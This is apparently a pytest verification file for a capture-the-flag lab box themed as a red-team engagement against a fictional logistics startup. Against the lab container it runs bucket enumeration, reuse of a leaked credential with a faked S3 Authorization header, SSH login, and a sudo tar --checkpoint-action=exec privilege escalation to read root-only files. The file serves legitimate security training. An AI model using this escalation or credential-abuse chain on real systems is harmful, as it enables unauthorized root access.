"""Phase 12 verification: cloudbreak-noob-bucket -- the Noob tier of
the new "Cloudbreak Pipeline" game (a cloud-native/DevOps-flavored
red-team engagement against the fictional "Nimbus Freight" logistics
startup). Deliberately distinct in flavor and mechanics from Domain
Zero Directory's SMB-based Noob box: object-storage bucket enumeration
instead of SMB shares, a leaked cloud storage credential instead of a
config backup password, and a sudo/GTFOBins ('tar') privesc instead of
'less'. Plain single-host box, no backend-specific dependency, works
on both Docker and Kubernetes.

The object storage is a small hand-rolled S3-compatible HTTP server
(see boxes-src/cloudbreak-noob-bucket/docker/s3server.py's own
docstring for why -- MinIO's community binaries were pulled from
distribution mid-project). It is NOT a full S3 implementation: no
SigV4 signature verification, just a presence/match check on the
Authorization header's Credential=... access key, which both `aws s3`
and `mc` always send in that exact shape. Good enough for the
challenge's real security property (the private bucket is unreachable
without the leaked credential) -- this test exercises that property
directly over HTTP rather than via a specific S3 client library, to
stay independent of whichever tool a real player reaches for.

10 real flags, climbing difficulty: public bucket enumeration (flags
1-3) -> discovering a second, unlisted-but-still-public bucket (flag 4)
-> a leaked cloud storage credential in a config file (flag 5) ->
using that credential to reach a private bucket (flag 6) -> a reused
SSH credential inside it (flag 7) -> SSH foothold (flag 8) -> a
sudo/GTFOBins ('tar') privesc, proven via a root-only file (flag 9)
before a full root shell (flag 10).

Real HTTP, real SSH, a real privilege escalation -- no mocks. Requires
the box image already built (ctf-boxes/cloudbreak-noob-bucket:latest),
`sshpass` on PATH, and a running orchestrator reachable at
ORCHESTRATOR_TEST_URL.
"""
import hashlib
import hmac
import os
import secrets as pysecrets
import subprocess

import pytest
import requests

BASE_URL = os.environ.get("ORCHESTRATOR_TEST_URL", "http://127.0.0.1:9100")
BOX_ID = "cloudbreak-noob-bucket"
_TEAM_ID_BASE = pysecrets.randbelow(1_000_000)

DEPLOY_PASSWORD = "Fr3ight-Deploy-2024!"  # fixed/narrative -- discoverable via the leaked app-config.json
ACCESS_KEY = "nimbus-deploy-svc"
# Not a real signature -- the server only checks the Credential=<key>/...
# component, matching exactly what aws/mc always send regardless of
# whether the server verifies the HMAC (see s3server.py's docstring).
FAKE_SIGV4_AUTH = (
    f"AWS4-HMAC-SHA256 Credential={ACCESS_KEY}/20261125/us-east-1/s3/aws4_request, "
    "SignedHeaders=host, Signature=deadbeef"
)


def expected_flag(secret: str, n: int) -> str:
    digest = hmac.new(secret.encode(), f"{BOX_ID}:{n}".encode(), hashlib.sha256).hexdigest()
    return f"HLC{{{digest[:10]}}}"


def _port(inst: dict, container_port: int) -> int:
    for p in inst["ports"]:
        if p["container_port"] == container_port:
            return p["host_port"]
    raise AssertionError(f"no port {container_port} in instance ports: {inst['ports']}")


def _get_object(host: str, port: int, bucket: str, key: str, authed: bool = False) -> requests.Response:
    headers = {"Authorization": FAKE_SIGV4_AUTH} if authed else {}
    return requests.get(f"http://{host}:{port}/{bucket}/{key}", headers=headers, timeout=10)


def _ssh(host: str, port: int, command: str, timeout: float = 20.0):
    return subprocess.run(
        [
            "sshpass", "-p", DEPLOY_PASSWORD, "ssh",
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10",
            "-p", str(port), f"nimbus-deploy@{host}", command,
        ],
        capture_output=True, text=True, timeout=timeout,
    )


def _escalate_via_tar(host: str, port: int, shell_command: str) -> str:
    """The box's one intended privesc: nimbus-deploy has passwordless
    sudo on /usr/bin/tar -- the classic GTFOBins --checkpoint-action
    trick, run as root."""
    result = _ssh(
        host, port,
        f"sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='{shell_command}'",
    )
    assert result.returncode == 0, f"GTFOBins escalation failed: {result.stderr}"
    return result.stdout


@pytest.fixture(params=["docker", "kubernetes"])
def box_instance(request):
    backend = request.param
    team_id = _TEAM_ID_BASE + (1 if backend == "docker" else 2)
    secret = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id, "box_id": BOX_ID, "team_secret": secret, "backend": backend},
    )
    r.raise_for_status()
    inst = r.json()
    try:
        yield inst, secret, backend
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")


def test_full_ten_flag_chain(box_instance):
    inst, secret, backend = box_instance
    host = inst["entry_host"]
    s3_port, ssh_port = _port(inst, 9000), _port(inst, 22)

    # Flags 1-3: anonymous enumeration of the public "public-assets" bucket.
    welcome = _get_object(host, s3_port, "public-assets", "welcome.txt").text
    assert expected_flag(secret, 1) in welcome
    readme = _get_object(host, s3_port, "public-assets", "README.md").text
    assert expected_flag(secret, 2) in readme
    deploy_log = _get_object(host, s3_port, "public-assets", "logs/deploy.log").text
    assert expected_flag(secret, 3) in deploy_log
    assert "nimbus-freight-backups" in deploy_log  # the hint pointing at the second bucket

    # Flags 4-5: the second, unlisted-but-public "backups" bucket.
    backups_readme = _get_object(host, s3_port, "nimbus-freight-backups", "README.txt").text
    assert expected_flag(secret, 4) in backups_readme
    config = _get_object(host, s3_port, "nimbus-freight-backups", "app-config.json").text
    assert expected_flag(secret, 5) in config
    assert DEPLOY_PASSWORD in config  # the leaked storage credential

    # Confirm the private bucket genuinely denies anonymous access first.
    denied = _get_object(host, s3_port, "nimbus-freight-private", "memo.txt", authed=False)
    assert denied.status_code == 403

    # Flags 6-7: the private bucket, using the leaked credential.
    memo = _get_object(host, s3_port, "nimbus-freight-private", "memo.txt", authed=True)
    assert memo.status_code == 200
    assert expected_flag(secret, 6) in memo.text
    creds = _get_object(host, s3_port, "nimbus-freight-private", "employee_portal_creds.txt", authed=True).text
    assert expected_flag(secret, 7) in creds

    # Flag 8: SSH foothold via the reused credential.
    user_txt = _ssh(host, ssh_port, "cat user.txt")
    assert user_txt.returncode == 0, user_txt.stderr
    assert expected_flag(secret, 8) in user_txt.stdout

    sudo_l = _ssh(host, ssh_port, "sudo -l")
    assert "/usr/bin/tar" in sudo_l.stdout

    # Flag 9: a root-only file, read via the GTFOBins escape before going for a full shell.
    audit_log = _escalate_via_tar(host, ssh_port, "cat /var/backups/storage_audit.log")
    assert expected_flag(secret, 9) in audit_log

    # Flag 10: full root shell via the same escape.
    root_output = _escalate_via_tar(host, ssh_port, "cat /root/root.txt")
    assert expected_flag(secret, 10) in root_output


def test_idempotent_create(box_instance):
    inst, secret, backend = box_instance
    r = requests.post(
        f"{BASE_URL}/instances",
        json={
            "team_id": inst["team_id"], "box_id": BOX_ID, "team_secret": "a-different-secret-must-be-ignored",
            "backend": backend,
        },
    )
    r.raise_for_status()
    assert r.json()["instance_id"] == inst["instance_id"]


def test_cross_team_flag_isolation(box_instance):
    inst, secret, backend = box_instance
    team_id_b = inst["team_id"] + 1000
    secret_b = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id_b, "box_id": BOX_ID, "team_secret": secret_b, "backend": backend},
    )
    r.raise_for_status()
    inst_b = r.json()
    try:
        host_a, port_a = inst["entry_host"], _port(inst, 9000)
        host_b, port_b = inst_b["entry_host"], _port(inst_b, 9000)
        welcome_a = _get_object(host_a, port_a, "public-assets", "welcome.txt").text
        welcome_b = _get_object(host_b, port_b, "public-assets", "welcome.txt").text
        assert expected_flag(secret, 1) in welcome_a
        assert expected_flag(secret_b, 1) in welcome_b
        assert expected_flag(secret, 1) != expected_flag(secret_b, 1)
        assert expected_flag(secret, 1) not in welcome_b
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst_b['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")
